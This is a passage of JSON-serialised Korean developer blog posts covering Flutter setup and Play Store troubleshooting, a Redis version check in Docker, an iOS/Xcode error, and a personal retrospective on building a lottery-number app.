환경변수)","description":null,"tags":["Flutter","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 신규 프로젝트를 셋업하면서...\n\n오늘 스토어에 등록도 하고 바로 패치도 하고...  \n다이나믹한 하루였는데, 바로 신규 프로젝트를 준비했다.\n\n[흑우집합소](https://blog.naver.com/wisseraph/223232966579)를 이렇게 허접하게 만들고 땡이냐? 라는 마인드는 아니다.  \n개발은 쭉 하면서 하나 더 해야 한다.\n\n1인 개발쪽으로 들어오면 아무래도 시간적으로는 좀 널널하지만,  \n회사 다닐때 보다 더 빠듯하게 해야 한다.\n왜냐하면 열심히 한 만큼 성과를 보기 때문이다.(당연한 이야기겠지만...)\n\n무튼 그래서 새로운 프로젝트 셋팅을 하는데 아래와 같은 에러가 반겨줬다.\n\n![](/img01.png)\n\nㅎㅎ...  \n흑우집합소에서 잘 되다가 갑자기 쌩뚱맞게 안되니까 어색하네...\n\n무튼 원인을 찾아보니 환경변수를 내가 안해줬었다. -\\_-;;  \n그래서 미래의 내가 또 잃어버릴 수 있으니 포스팅으로 남겨둔다.\n\n## 환경 변수를 설정\n\n일단 난 Mac OS를 사용하는데 **zsh**를 사용한다.  \n다른 OS나 shell도 동작 원리는 비슷하다.\n\n먼저 자신의 **Flutter SDK**가 설치된 위치를 알아야 한다.  \n그리고 나서 자신의 Home Dir에서 **.zshrc** 파일을 vim이나 에디터로 열고, 맨 마지막에 아래 내용을 추가해준다.\n\n> export PATH=\"/Users/my/Dev/flutter/bin:\\$PATH\"\n\n이렇게 하고, 쉘을 재시작하고 입력하면 해결 완료!\n\n```toc\n\n```\n"},{"excerpt":"흑우집합소 안드로이드 버전을 등록하고... 흑우집합소 안드로이드 버전을 등록하고 승인이 났다. 근데 안드로이드 앱은 너무 오랜만에 올려봐서 그런가... 새로 바뀐 플레이 스토어가 어색했다. 무튼 그렇게 이것저것 보다가 이상한 경고를 보게 되었다.  뭔가 글귀는 무시무시해보이는데 경고라서 크게 신경쓰지는 않으려 했지만, 처리하지 않으면 뭔가 문제가 생길거 …","fields":{"slug":"/dart_flutter/231011_appbundle_warning_anr/"},"frontmatter":{"date":"October 11, 2023","title":"구글 플레이스토어 경고 (이 App Bundle 아티팩트 유형은 네이티브 코드를 포함하며 아직 디버그 기호가 업로드되지 않았습니다.)","description":"App Bundle 아티팩트 유형은 네이티브 코드를 포함하며...","tags":["Flutter","Google PlayStore","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 흑우집합소 안드로이드 버전을 등록하고...\n\n[흑우집합소 안드로이드](https://play.google.com/store/apps/details?id=dev.mhlab.bcow_world) 버전을 등록하고 승인이 났다.  \n근데 안드로이드 앱은 너무 오랜만에 올려봐서 그런가...  \n새로 바뀐 플레이 스토어가 어색했다.\n\n무튼 그렇게 이것저것 보다가 이상한 경고를 보게 되었다.\n\n![](/img01.png)\n\n뭔가 글귀는 무시무시해보이는데 경고라서 크게 신경쓰지는 않으려 했지만,  \n처리하지 않으면 뭔가 문제가 생길거 같고 그래서 처리해보기로 했다.\n\n## How To?\n\n먼저 자신의 프로젝트의 디렉토리로 가서 아래의 경로를 따라가본다.  \n물론 이건 스토어 등록용 Release로 빌드를 했을 때 나오는 산출물이다.\n\n```\n[자신의 프로젝트]/build/app/intermediates/merged_native_libs/release/out/lib\n```\n\n여기에 들어와서 경로 안을 보면 아래와 같은 디렉토리가 보일 것이다.\n\n![](/img02.png)\n\n그럼 이걸 압축해준다.  \n맥에서는 그냥 전부 선택하고, **압축** 이란 메뉴를 쓰면 된다.\n\n그리고 본인의 구글 플레이 콘솔에 접근하여 **출시**탭의 **App Bundle 탐색기**로 이동한다.\n\n![](/img03.png)\n\n그리고 아래의 사진처럼 앱 버전에 **->**화살표를 클릭한다.\n물론 나는 진행을 해서 버전 상태가 활성으로 되어 있지만, 보통 비활성이다.\n\n![](/img04.png)\n\n그럼 아래 사진처럼 **다운로드** 탭으로 이동한 다음 **네이티브 디버그 기호**라는 곳에 버튼을 클릭하면 업로드 창이 뜬다.\n\n![](/img05.png)\n\n난 미리 해둬서 아이콘이 쓰래기통으로 되어 있지만 안되어 있으면 업로드 박스 아이콘이 뜬다.  \n여기서 아이콘을 클릭하면 업로드 창이 뜨는데, 여기에 아까 압축한 파일을 올려주자.\n\n이렇게 하면 경고는 사라진다.\n\n```toc\n\n```\n"},{"excerpt":"역시나 한번에 되는건 없다. 오전에 플레이 스토어에 등록 알림이 와서 확인해봤다.  거부됨이란 단어를 보자마자 든 생각은 역시 한번에 되는건 없구나 였다. 메일로 자세한 정보를 보냈다고 해서 메일을 확인해봤다.  뭔가 엄청 장황하게 써뒀는데 유독 광고ID라는 키워드만 보였다. 그래서 한번 찾아보니, 역시 정책 관련 업데이트 보완이었다. 뭔가 안도감이...…","fields":{"slug":"/dart_flutter/231011_flutter-android-open-ban/"},"frontmatter":{"date":"October 11, 2023","title":"안드로이드 배포 후 (Google Play 정책 데이터 보안 양식 잘못됨) 해결 방법","description":null,"tags":["Flutter","Google PlayStore","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 역시나 한번에 되는건 없다.\n\n오전에 플레이 스토어에 등록 알림이 와서 확인해봤다.\n\n![](/img01.png)\n\n**거부됨**이란 단어를 보자마자 든 생각은 역시 한번에 되는건 없구나 였다.  \n메일로 자세한 정보를 보냈다고 해서 메일을 확인해봤다.\n\n![](/img02.png)\n\n뭔가 엄청 장황하게 써뒀는데 유독 **광고ID**라는 키워드만 보였다.  \n그래서 한번 찾아보니, 역시 정책 관련 업데이트 보완이었다.  \n뭔가 안도감이...\n\n해결하는 법은 생각보다 간단하다.  \n물론 나처럼 광고쪽 문제만 이라면 더 간단하고, 뭔가 서버로 민감 정보를 보내거나 하면 몇 가지 정책을 또 업데이트 해줘야 한다.\n\n## 해결을 위해선...\n\n먼저 구글 플레이 콘솔에 접근한다.\n\n![](/img03.png)\n\n그리고 **정책**에서 **앱 콘텐츠**를 선택해서 들어간다.\n\n![](/img04.png)\n\n나는 선언을 했는데 안하면 저기에서 정책을 등록하기인가 로 들어가야 한다.  \n지금 화면은 정책 업데이트가 필요하여 저렇게 뜨는데, 각 화면은 여기 예시와 차이가 있을 수 있다.\n\n![](/img05.png)\n\n그럼 **데이터 보안**이라는 항목에 들어오고, 읽어본 후 하단 오른쪽에 **다음**버튼을 클릭한다.\n\n### 데이터 수집 및 보안\n\n![](/img06.png)\n\n데이터 수집 및 보안은 위와 같다.  \n처음이라면 각 항목들이 **아니오**로 되어 있는데, 전부 **예**로 바꿔준다.  \n만약 계정을 생성하는 형태의 앱이라면 적절한 값을 선택한다.  \n근데 선택사항이라서 필수는 아닌듯 싶다.\n\n### 데이터 유형\n\n여기는 데이터 유형인데 각 항목을 아래와 같이 참고한다.\n\n- 위치 : 대략적인 위치 선택\n- 앱활동 :앱 상호작용\n- 앱 정보 및 성능: 비정상 종료 로그, 진단, 기타 앱 성능 데이터\n- 기기 또는 기타 ID: 기기 또는 기타 ID\n\n개인정보, 금융정보, 이런 기타 내용은 해당 사항이 있는 앱들만 선택해주고, 그 외는 위와 같이 하면 된다.  \n이렇게 선택하고 다음으로 넘어간다.\n\n### 데이터 취급 및 처리\n\n그 다음은 취급 및 처리다.\n\n![](/img07.png)\n\n위 사진처럼 뜰텐데 처음 하면 각 항목들이 미 완료 상태로 뜬다.  \n그럼 화살표를 선택해서 체크박스를 해야 하는데 각 체크박스는 아래 사진을 참고하자.\n\n![](/img08.png)\n\n난 애널리틱스를 쓰고, 흑우집합소 서버와 데이터를 공유하는 거라서 **공유된**, **앱 기능**, **애널리틱스**, **광고 또는 마케팅**, **사기 예방, 보안 규정 준수**에만 선택을 했다.  \n다른 항목도 다 비슷하게 하면 되는데 자신의 서비스와 맞는 것을 선택하자.\n\n이후 최종적으로 다 선택한 후 제출하면 된다.  \n그리고 잠시 기다리면...\n\n![](/img09.png)\n\n이렇게 스토어 검토가 완료되어 등록이 끝난다.  \n역시 초행길은 쉽게 쉽게 갈 수가 없다. ㅎㅎ\n\n```toc\n\n```\n"},{"excerpt":"간만에 올리는 개발 포스팅 (글 시작에 앞서 장문의 내용이며, 개발의 관점과 더불어 다른 관점에서도 작성됨을 미리 고지합니다.) 정말 오랜만인것 같다. 마지막이 7월달 포스팅이었는데 거진 두달 정도 뒤에 포스팅을 올린다. 개발 블로그를 꾸준히 하려 해도 개발할 것도 많고, 다른 일도 많아서 우선순위가 많이 밀렸다. 사실 흑우집합소 웹 버전을 개발하고 나서…","fields":{"slug":"/my_story/231008_bcow-world_story/"},"frontmatter":{"date":"October 08, 2023","title":"(회고록) 흑우집합소 웹 & 모바일 서비스를 오픈해보면서...","description":null,"tags":["My Story","흑우집합소"],"series":"My Story","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 간만에 올리는 개발 포스팅\n\n> (글 시작에 앞서 장문의 내용이며, 개발의 관점과 더불어 다른 관점에서도 작성됨을 미리 고지합니다.)\n\n<br>\n\n정말 오랜만인것 같다.  \n마지막이 7월달 포스팅이었는데 거진 두달 정도 뒤에 포스팅을 올린다.\n\n개발 블로그를 꾸준히 하려 해도 개발할 것도 많고, 다른 일도 많아서 우선순위가 많이 밀렸다.  \n사실 흑우집합소 웹 버전을 개발하고 나서 얻은 지식들도 많고, 정리할 포스팅 거리도 노션에 잔뜩 쌓아뒀는데,  \n이걸 다시 정리해서 포스팅하려니 시간이 많이 걸릴 거 같았다.\n\n그래서 결국 몇 부분만 포스팅하고 대부분은 노션에 묻혀있는 상태이다.  \n거기다가 한 8월 중순 넘어 말? 중말쯔음부터 플러터를 공부하며 프로젝트를 시작했다.\n\n흑우집합소가 오픈한지 좀 되었는데 사용자가 사실 많이 모이진 않았다.  \n뭐 컨텐츠가 부족한 부분도 있고, 원래 만드려 했던게 로또 커뮤니티인데 그 시스템을 전부 혼자서 빠른 시간안에 개발하는건 무리라고 판단했다.\n\n그래서 난 모바일 앱을 먼저 출시하고, 로또와 관련된 기능을 더 준비하고 제공해서 사용자를 모으는 전략을 취하기로 했다.  \n사실 로또는 크게 관심을 가지진 않는다.  \n그럴수밖에 없는게 1등 당첨금이 많이 낮다.\n\n## 잠시 로또 이야기로...\n\n![](/img01.png)\n\n내 흑우집합소에서 따온건데 최근회차의 1등 세후를 보자.  \n당첨자가 7명나온 1082회차랑 1080회차를 제외하곤 전부 20억 이하이다.  \n게다가 당첨금이 보통 10~16억 사이인데 이거론 인생역전은 택도 없다.\n\n![](/img02.png)\n\n최근 회차도 정말 처참한 수준이다.\n\n내 네이버 블로그에도 글을 남겼지만, 이거론 강남3구나 잠실 이런 부동산을 살 수 없다.  \n아니 산다해도 지속가능성(월/년 생활 유지비 + 세금 + 생활수준을 따라가기 위한 각종 부대비용 등)을 유지하기 힘들다.  \n뭐 갭투자할 수는 있겠다.  \n나도 갭으로 이번에 하나 들어가있는데 요새 부동산이 진짜 미친거 같다.  \n내가 구매했을때보다 값이 몇천씩 올라가서 매도자도 아마 속이 좀 상할거 같긴 하지만...\n\n요새 로또는 꽁돈이라고 하나 세금도 많이 가져가고 당첨금이 턱없이 낮아서 인생역전은 불가능한 금액이다.  \n그냥 적당한 투자금 정도?  \n나도 경제적 자유를 생각하는 사람 중 하나인데 이걸 이루려면 개인적인 기준 부동산 자산 포함 70억 정도 있어야 가능할거 같다.\n\n사실 개발자로 살려고 했던 시절에는 열심히 일하면 나도 한강이 보이는 집에 살 수 있겠지? 라는 망상을 하곤 했다.  \n솔직히 이야기하면 개발자로 살면 불가능하다.  \n뭐 CEO나 스타텁 잘 키워서 엑싯을 잘 하면 가능하겠지만, 그건 퓨어 개발자가 아니니까?\n\n그리고 네카라쿠? 뭐 유명 IT 기업들 묶어서 높은 연봉 기업들이 있는데 여기 다니면 좋겠지.  \n월급이랑 성과급 등이 쎄니까... 근데 개인 시간은 없을거 같다.  \n이제는 준거집단이 많이 변해서 주변에 개발자가 거의 없는데 예전 네이버 다니던 친구나 토스에 있던 지인들 보면 거의 회사에서 시간을 보내거나,  \n회사의 업무에 매달려서 있는 케이스였다.\n\n여긴 개발 블로그니까 개발자 분들이라면 공감할 거 같다.  \n개발 영역은 끊임없는 학습과 신기술에 대한 연구를 요구한다.\n\n![](/img03.png)\n\n진짜 개발자에게 맞는 책인거 같다(?)\n\n개발업으로 평범하게 먹고 사는것에는 문제가 없을것이다.  \n노후가 문제지...\n\n난 다른 사람들처럼 금수저 은수저도 아니고, 다행히 부모님이 어디 아픈것도 없으시고, 그냥 평범한 숟가락을 들고 있는 사람이다.  \n나같은 사람은 더 나아가려면 투자라는 수단이 매우 중요하다.  \n개발업이 나이를 안따진다 해도 결국 40 넘어가면 회사 취업하기 힘들고, 들어가서도 뭔가 좀 압박감이 있다.  \n**게다가 월급쟁이의 끝은 해고다.**\n\n그래서 난 마지막 18년인가 스타트업을 마지막으로 개발업을 놓고 다른 경험을 많이 쌓았다.  \n일단 운이 좋아서 비트코인과 주식 투자로 씨드를 좀 마련했다.  \n그리고 부동산에 눈을 돌려 공부를 하고 임장도 진짜 많이 다녔다.  \n이렇게 해서 투자 영역을 공부해보니 마인드가 많이 달라졌다.\n\n## 구멍가게 월 10만원을 벌어도 내것 하는게 좋다.\n\n어디선가 본 내용이었다.  \n마지막 스타텁을 다닐땐 추가수당도 못받고 근무시간 기본 10시간이 넘었다.  \n진짜 지금의 마인드였으면 진작에 때려쳤을텐데...  \n사람들은 시간의 중요성을 알지 모르겠지만, 진짜 요즘 나에겐 1분 1초가 아깝다.  \n(물론 이걸 알지만 놀러가고 와인 마시는걸 좋아해서 앞으로 더 못나아가는거 같다 -\\_-;;)\n\n내 시간을 녹이고 다른 사람에게 시간에 대한 가치를 받아오는 것인데 이게 생각보다 많이 짜다.  \n공짜는 없고, 나의 시간을 대여하려는자는 최대한 나를 뜯어먹으려 한다.  \n이게 표현이 이렇지만, 네이버, 카카오, 토스 등 유명 기업들 다니는 사람들은 다 선택을 한 것이다.  \n직접 투자를 해서 더 벌 자신이 없으니 나는 그냥 고연봉자로 짧고 강한 코스를 선택한게 아닐까 싶다.\n\n내가 짧다고 표현을 한것은 오류가 있을 수 있다.  \n근데 뉴스에서(뉴스를 100% 신뢰하긴 어렵지만) 경기가 어렵고 희망퇴직도 빨리 받는다는걸 보면 고액 연봉을 10년 이상 받는건 일부가 아닐까 싶다.  \n대기업이라 사람을 함부로 자르진 못하겠지만 말이다.  \n물론 요새 사람들이 많이 똑똑해지고 투자에 대한 갈망이 생겨 잠을 줄여서라도 많이들 투자를 하곤 한다.  \n아마 저런 분들은 이런 느낌으로 살지 않을까 싶다.\n\n![](/img04.png)\n\n근데 난 내 시간을 온전히 내가 쓰고 싶고, 현재 돈이 궁한것도 아니고,(물론 생활비와 와인 살돈은 필요하다. -\\_-;;)  \n내 시간 전부를 팔고 싶진 않다.  \n그래서 난 한번 직접 나만의 서비스를 만들고, 여기서 기본 생활비 정도 나오게끔만 굴려보자 라는 생각을 하게 되었다.  \n인터넷을 찾아보니 나같은 길을 걷는 사람들이 몇몇 있었다.\n\n어떤이는 유튜브를 하면서 부업을 하고, 어떤이는 자신의 서비스를 많이 키우기도 하고...  \n방법은 다양했다.\n\n## 그래서 웹(백엔드, 프론트엔드, 인프라)과 모바일(안드/아이폰)을 다 해야 한다?\n\n내가 서비스를 만들면서 느낀건 웹만으로도 컨텐츠 구현이 가능한 서비스가 있고, 둘 다 필요한 서비스가 있다.  \n흑우집합소의 경우 웹에서도 가능하지만, 내가 로또 전문가  \n(흑집소를 만드는데 도움을 많이준...어쩌면 이 프로젝트의 시동을 건 지인이다.)에게 이것저것 문의를 해본 결과  \n로또 구입자의 경우 보통 자동을 많이 긁는데 분석하는 사람들은 피씨보다는 앱을 더 많이 쓴다 였다.\n\n사실 난 로또 전문가가 아니다.  \n예전 네이버 블로그에서도 쓴거 같긴한데 5천~1만원, 가끔 꿈 좋은거 꾸면 3만원 정도 구입하는게 끝이다.  \n그리고 로또는 운빨이라고 생각하는 사람 중 한명이다.\n\n|                 |                 |\n| --------------- | --------------- |\n| ![](/img05.png) | ![](/img06.png) |\n\n<br>\n\n그래도 저 로또 전문가 덕에 3등이 두번 되기도 했다 -\\_-;;  \n물론 저 양반은 2등도 몇번 된 양반이라...  \n사실 분석이 의미가 있나 라고 생각하지만 사진 보면 또 믿게되는...(이게 사이비의 원리인가...)\n\n근데 이걸 주제로 삼은 이유는 재미있을거 같아서였다.  \n당시 주제선정에 어려움이 있었고,(물론 지금은 할게 넘쳐난다...) 로또 커뮤니티를 만들어볼 요량으로 시작했었다.  \n근데 위에도 써놓은 것처럼 1인 개발이고, 시간과 자원은 한정적이니 전략을 로또 기능으로 먼저 취한 것 뿐이다.\n\n아마 여기 블로그에도 썼던거 같은데...  \n원래 난 스프링 백엔드가 메인이었었다.  \n근데 다시 개발쪽을 잡으면서 전에 스타텁 같이 다녔던 지인 덕분에 타입스크립트를 알게되었고,  \n리엑트와 Next.Js, 그리고 Nest.Js를 알게 되었다.\n\n처음에 배우는데 약간 시간은 걸리고 시행착오도 많았지만, **MyMeLink**라는 서비스도 만들어보고,  \n[흑우집합소](https://bcow.world)까지 만들게 되었다.\n\n웹 서비스를 만들고 버그 고치고, 기능 몇개씩 올리고, 내 네이버 블로그에 홍보도 했다.  \n근데 초창기 흑우집합소에서는 비회원의 경우 번호를 최대 30개밖에 못만들게 했다.  \n이 제약 때문인지 초반엔 회원이 좀 모이는가 싶었다.\n\n하지만 제약이 오히려 독이 아닐까 싶어서 이 제약을 풀었더니 그 시점 이후부터 회원은 모이지 않았다.  \n그러나 로그를 보면 꾸준히 어느정도 번호 생성은 진행되는 것 같았다.\n\n내가 와인 마시는 모임에서 로또 하는 분들께 여쭤봤는데 모바일 웹은 좀 불편한거 같다 라는 의견이 지배적이었다.  \n사실 사용자 피드백이 중요한데 이걸 웹 서비스 내에서 바로 받게끔 해야 하지만... 아직 그런 시스템을 만들지 못했다.  \n그 이후부터 모바일 앱을 만들어야 겠다는 결심을 했다.\n\n## 네이티브? 플러터? 리엑트 네이티브?\n\n모바일 버전을 기획하기 전 기술부터 정해야 했다.  \n코틀린과 스위프트의 네이티브, 다트를 사용하는 플러터, 리엑트를 그대로 쓰는 리네...\n\n네이티브로 하고 싶긴 했는데 바로 접었다.  \n일단 난 1인 개발자라서 두 언어까지 하기엔 좀 벅찼다.  \n그래서 하나의 소스로 두 플랫폼을 다룰 수 있는 플러터와 리네로 좁혀졌다.\n\n근데 리네는 내가 잘못 안 것도 있지만... 엑스포가 상당히 제한적이다.  \n난 리네 == 엑스포 라고 인식을 해서 바로 접었다.  \n물론 기술 조사를 너무 건성으로 한 것도 있긴 했지만, 플러터가 개인적으로 땡겼다.\n\n그래서 바로 온라인에 무료로 풀려있는 플러터 강의를 하루만에 빠른 배속으로 듣고 대충 개념만 이해한 뒤에 넘어갔다.  \n아마 취업 코스로 했다면 엄청 오래 걸리고 너무 심층적으로 가서 못했지 않을까 싶다.\n\n무튼 기술을 어느정도 익히고, UI 및 UX를 설계했다.  \n진짜 그냥 코드만 짜는건 쉽다.  \n하지만 사용자에게 편리하고 직관적인 UI를 설계하고, 그걸 구현하는게 일인거 같다.\n\nGPT 덕분에 괴랄한 부분은 어느정도 커버를 쳤다.  \n그리고 약 한달 조금 넘어서 개발을 끝냈다.\n\n![](/img08.jpeg)\n\n개발을 끝내고 점검표도 한땀한땀 만들었다.\n\n![](/img07.png)\n\n그리고 일단 안드로이드 마켓에는 연휴에 올렸는데 아직도 검토중이다.\n\n![](/img09.png)\n\n원래 한 4~5시간이면 등록되는걸로 알고 있는데, 첫 등록이라 그런지 시간이 좀 걸리는거 같았다.\n그리고 올리고 나서 보니까 버그가 좀 있었다... -\\_-;; (점검표는 왜...)\n\n![](/img10.png)\n\n얼른 또 개발을 해서 0.9.1 버전을 업데이트 해야 할 듯 싶다.\n\n물론 아이폰도 준비는 되었고, 개발자 개정도 등록을 다 한 상태인데 몇 가지 주요 기능이 현재 빠진 상태다.  \n그래서 이 기능까지 합쳐서 1.0.0 배포를 할 때 아이폰을 배포할 예정이다.  \n사실 네이버에 오픈하면 홍보로 올릴 공지사항 포스팅도 준비는 해뒀다.\n\n![](/img11.png)\n\n근데 아직 검토중이라서...  \n여기에 먼저 올리는 건 홍보가 아닌 회고 + 개발 관점이라서?  \n무튼 출시가 되기를 기다리는 중이다.\n\n## 처음부터 대박은 없다.\n\n사실 큰 기대는 안한다.  \n오픈하고 다운횟수가 일주일에 100회만 되도 난 만족이다.  \n아마 못채울 확률이 높긴하다.\n\n왜냐하면 이미 유사 서비스도 있고, 내가 인플루언서도 아니라서 사람들은 내가 만든줄도 모를거다.  \n이럴때를 대비해서 네이버 블로그를 꾸준히 관리를 하고 있다.\n\n![](/img13.png)\n\n그래서 이렇게 포스팅 앞에다가 내가 직접 만든 서비스 광고를 붙인다.  \n이건 뭐 내가 만들고 한거니 뒷광고 앞광고도 아니다. -\\_-;;\n\n못해도 하루 300명 이상은 방문해주는 블로그인데 이상한 광고쟁이들 다 차단하고 나름 클린하게 관리하고 있다.\n\n![](/img14.png)\n\n무튼 이런 이유로 초기에는 너무 기대를 하면 안된다.  \n단지 다른 서비스와 차별화를 두고 기능을 올리면서 조금씩 유저를 모아간다는 생각을 가지는게 좋은거 같다.\n\n전에 개발업 때려쳤을 때 유튜브를 잠시 했던 적이 있다.  \n당시 파컷으로 영상 편집도 하고, 직접 방송도 해보고 했는데 이게 생각보다 어렵다.  \n꾸준히 하는게 매우 중요하고 컨텐츠도 중요하다.  \n사실 유튜브는 지금도 다시 해보고 싶긴 한데, 시간이 매우 많이 부족하다.\n\n![](/img12.png)\n\n요새 제일 필요한 아이템...  \n나한테 거는게 아니라 나를 제외한 모든 세상에 존야를 걸어버리고 싶다. -\\_-;;\n\n내가 이번에 내세우는건 네이버 블로그에도 적었지만, 기존 로또 앱은 정말 불편하고 어렵게 되어있다.  \n그리고 광고 도배 앱도 있고...  \n난 흑우집합소가 다른 앱과의 차별점은 확실히 두고 있다고 생각한다.\n\n## 이게 끝?\n\n아니다.  \n일단 흑우집합소는 되던 안되던 계속 해서 로또 커뮤니티로 만드는게 목표다.  \n그리고 또...\n\n이제 와인 앱이 남았다.  \n한 3년 되었나 와인에 빠져서 산게?  \n진짜 미쳐서 살 때는 거의 매일 마시고, 모임에도 나가고...  \n와인 값에만 매달 100~200 이상 사용한거 같기도 하다.  \n요새도 호캉스 촌캉스, 집, 모임 등등 가리지 않고 마신다... -\\_-;;\n\n|                 |                 |\n| --------------- | --------------- |\n| ![](/img15.png) | ![](/img16.png) |\n\n근데 이렇게 와인을 접하다 보니 시음노트를 쓰게 되고...  \n이걸 내가 블로그에 정리를 하긴 하는데 또 아이디어가 여러가지가 떠올랐다.  \n그래서 아이디어를 정리했고, 다음주 부터 또 개발을 할 것 같다.\n\n특히 와인 마시는 사람들은 알겠지만, 장기 숙성용 와인의 시음 적기가 궁금할 것이다.\n\n![](./images/231008_bcow-world_story/img17.jpg)\n\n이번에 와인 같이 마시던 지인이 IT쪽을 몰라서 내가 도움을 줬는데(사실 너무 간단한거긴 해서 미안할 정도..)  \n이걸 선물로 줬다.  \n극구 거부하다가 결국 받게 되었고, 나도 셀러에 박아둔 파이퍼하이직을 하나 드렸다. (그렇게 트레이드...)\n\n무튼 저 샤스 스플린은 아는 사람은 알겠지만 2019빈 기준 시음 적기는 25년 ~ 42년 사이쯔음 된다.  \n물론 디캔딩으로 최대한 풀면 지금도 마실 수는 있겠지만...\n\n이런 정보를 얻으려면 이곳저곳 뒤져야 하는데 난 이 정보를 지금 다 모으고 있다.  \n그래서 내가 만들 서비스에 이런 정보를 제공하는게 목표이고, 이런 종류의 앱을 만들려 한다.\n\n## 간만에 긴 포스팅을 쓰니...\n\n쓰고 보니 개발 회고 보다는 그냥 개인 기록에 가까운것 같았다.  \n뭐 오랜만에 이렇게 쭉 풀고 나니 뭔가 마음 한켠이 후련해지는거 같다.\n\n앞으로도 바쁘겠지만...  \n이번에 플러터 개발을 하면서 배운 것을 조금씩은... 조금씩은 포스팅 해보도록...해야겠다...\n\n사실 내가 기술적으로 높은 인물도 아니고, 유명인도 아니라서 블로그 글을 누가 읽을지 모르겠지만,  \n이렇게 적어두면 내가 가끔 네이버 블로그랑 같이 일기처럼 읽기에...\n\n그냥 자기만족의 포스팅으로 만족하려 한다.  \n글을 읽어 주신 분이 있다면 대단히 감사드리고...\n\n혹여나 인생의 과도기, 개발자로 또는 개발업에 대한 회의감이 드는 분 등등...  \n선택의 앞에 서신 분들은 좋은 선택을 하셨으면 하고, 꼭 대기업이 정답은 아니라고 말씀드리고 싶다.\n\n돈 많이 줘봤자 길게 못가고, 길게 간다 해도 그만큼 다 뽑아먹기에...  \n그런데에 너무 집착하기 보다는 나 자신에게 시간적 여유가 많은 곳에 가셔서,  \n**꼭 개발 외에 다른 분야에 대한 공부도 하셨으면 좋겠다.**\n\n개발업에 대한 지식도 중요하지만 노후에는 개발 스킬이 큰 도움이 되지 않을거라고 난 확신한다.  \n오히려 돈 벌때 재무상담 또는 설계를 통해 연금, 부동산(똘똘한 1채 또는 수익형), 채권 수익 등  \n이게 노후에 도움이 되면 되었지, 분산처리, 노드, 인프라, 백엔드...\n\n솔까 나이 50먹고 나면 은퇴각 잡히면 저런거 아무짝에 쓸모없다.  \n오히려 건강 관련 보험이 도움이 되면 되었지...\n\n무튼...  \n더 쓰면 길어지니 여기서 잡담 섞인 회고록을 마쳐본다.\n\n```toc\n\n```\n"},{"excerpt":"레디스를 쓰다가... 최근 아마존에 있던 1세대 흑우집합소를 더 이상 쓰지 않게 되어 로컬로 옮기기로 했다. 근데 내가 쓰는 도커 레디스랑 아마존 도커 레디스랑 버전이 맞지 않아서 문제가 생겼다. 버전을 확인해보려 했는데 잘 몰라서 찾다가 자주 보게 될거 같아서 포스팅으로 남겨둔다. 먼저 도커 내부로 접근해서 레디스 쉘로 가야 한다. 들어가서 다음과 같이…","fields":{"slug":"/redis/230727_docker_in_redis_version/"},"frontmatter":{"date":"July 27, 2023","title":"Docker 내에서 구동중인 레디스 버전 확인하기","description":null,"tags":["Redis"],"series":"Redis","previewImage":"redis_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_redis.png)\n\n# 레디스를 쓰다가...\n\n최근 아마존에 있던 1세대 흑우집합소를 더 이상 쓰지 않게 되어 로컬로 옮기기로 했다.  \n근데 내가 쓰는 도커 레디스랑 아마존 도커 레디스랑 버전이 맞지 않아서 문제가 생겼다.\n\n버전을 확인해보려 했는데 잘 몰라서 찾다가 자주 보게 될거 같아서 포스팅으로 남겨둔다.\n\n먼저 도커 내부로 접근해서 레디스 쉘로 가야 한다.\n\n```\ndocker exec -it redis_s bash\n```\n\n들어가서 다음과 같이 명령어를 쓴다.\n\n```\nredis-cli -a my_pass info\n```\n\n이렇게 하고, 스크롤을 좀 올리면 **redis_version**에서 버전 확인이 가능하다.\n"},{"excerpt":"전에 안드로이드에 이어... iOS도 한번 실제 기기에 올려보려고 했다. 근데 내가 iOS를 개발한지 6년? 잠깐 스위프트 써본 뒤에 안한지 오래되서... iOS에 개발자 모드가 있다는 것은 처음 알았다. -_-;;   무튼 이 개발자 모드를 활성화 해줘야 플러터 앱을 올릴 수 있다. 라떼는... 애플 개발자 계정을 매년 100$인가 내고 등록을 해야 실…","fields":{"slug":"/dart_flutter/230712_flutter_run_ios/"},"frontmatter":{"date":"July 12, 2023","title":"Flutter에서 iOS 기기에 올릴 때 에러 발생 (This operation can fail if the version of the OS...)","description":null,"tags":["Flutter","iOS","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 전에 안드로이드에 이어...\n\niOS도 한번 실제 기기에 올려보려고 했다.  \n근데 내가 iOS를 개발한지 6년?  \n잠깐 스위프트 써본 뒤에 안한지 오래되서...\n\niOS에 개발자 모드가 있다는 것은 처음 알았다. -\\_-;;\n\n| ![](/img03.png) | ![](/img04.png) |\n| --------------- | --------------- |\n\n<br>\n\n무튼 이 개발자 모드를 활성화 해줘야 플러터 앱을 올릴 수 있다.  \n라떼는...  \n애플 개발자 계정을 매년 100\\$인가 내고 등록을 해야 실제 기기에서 테스트 가능했는데...  \n정말 시대가 많이 변했다.\n\n무튼 기존 애플 개발자 계정을 XCode에 연동하고, 실제 기기를 연결한 다음,  \nXcode에서 플러터 앱을 열고 실행을 시켰다.\n\n근데 아래와 같은 에러가 발생했다.\n\n```\nThis operation can fail if the version of the OS on the device is incompatible with the installed version of Xcode\n```\n\n스크린샷은 못찍었는데 대충 위와 같은 에러가 발생했다.\n\n## 원인은 업데이트?\n\n난 OS가 벤츄라 이전꺼를 쓰고 있었다.(몬터레이)  \n그래서 일단 OS 업데이트를 하고 Xcode도 업데이트 했다.\n\n하지만 동일한 에러가 발생했다.  \n그래서 찾아보니 Xcode의 iOS호환성 체크가 필요하다고 했다.  \n자세한 것은 [애플 개발자 사이트](https://developer.apple.com/kr/support/xcode/)에서 확인이 가능하다.\n\n![](/img01.png)\n\n저기 보면 필요 OS 옆에 SDK가 있는데 저게 본인 아이폰의 버전보다 낮거나 같아야 한다.  \n근데 업데이트를 해도 난 안되었다.  \n(물론 뒤에 안 사실이지만...Xcode 업데이트를 안했다 -\\_-;;)\n\n## 다른 원인을 찾다.\n\n위에서 언급한 바와 같이 난 업데이트를 안했지만, 